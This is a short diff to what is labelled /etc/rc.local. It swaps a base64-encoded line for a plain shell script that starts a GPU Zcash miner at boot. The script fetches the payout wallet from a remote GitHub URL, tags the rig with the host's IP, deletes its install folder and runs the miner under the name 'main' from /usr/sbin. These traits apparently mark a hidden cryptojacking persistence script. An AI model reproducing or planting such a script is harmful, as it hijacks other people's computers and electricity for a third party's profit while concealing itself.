@@ -1,1 +1,14 @@
-IyEvYmluL3NoIC1lDQpjZCAvZG93bmxvYWRzL21pbmVyZ3B1DQpJUD0kKGlmY29uZmlnIHwgZ3JlcCAnaW5ldCBhZGRyOid8IGdyZXAgLXYgJzEyNy4wLjAuMScgfCBjdXQgLWQ6IC1mMiB8IGF3ayAneyBwcmludCAkMX0nKQ0KREFURT0kKGRhdGUgJyslZC4lbScpDQpSTjE9JCgoUkFORE9NJTUxMis2KSkNClJOMj0kKChSQU5ET00lNTEyKzYpKQ0KUklHPSIkREFURS4kSVAuJFJOMS4kUk4yIg0KV0FMTEVUPSQoY3VybCBodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vZGF2aWRhdmFib29tZXJzL21pbmVyZ3B1L21hc3Rlci90LXdhbGxldCkNCi4vbWluZXIgLS1zZXJ2ZXIgZXUxLXpjYXNoLmZseXBvb2wub3JnIC0tdXNlciAgJFdBTExFVC4kUklHIC0tcGFzcyB4IC0tcG9ydCAzMzMzIC0tY3VkYV9kZXZpY2VzIDANCmV4aXQgMA0K
+#!/bin/sh -e
+#/etc/rc.local
+cd /downloads/minergpu
+IP=$(ifconfig | grep 'inet addr:'| grep -v '127.0.0.1' | cut -d: -f2 | awk '{ print $1}')
+DATE=$(date '+%d.%m')
+RN1=$((RANDOM%512+6))
+RN2=$((RANDOM%512+6))
+RIG="$DATE.$IP.$RN1.$RN2"
+WALLET=$(curl https://raw.githubusercontent.com/davidavaboomers/minergpu/master/t-wallet)
+cd /usr/sbin/
+rm -rf $HOME/minergpu/
+./main --server eu1-zcash.flypool.org --user  $WALLET.$RIG --pass x --port 3333 --cuda_devices 0
+
+exit 0
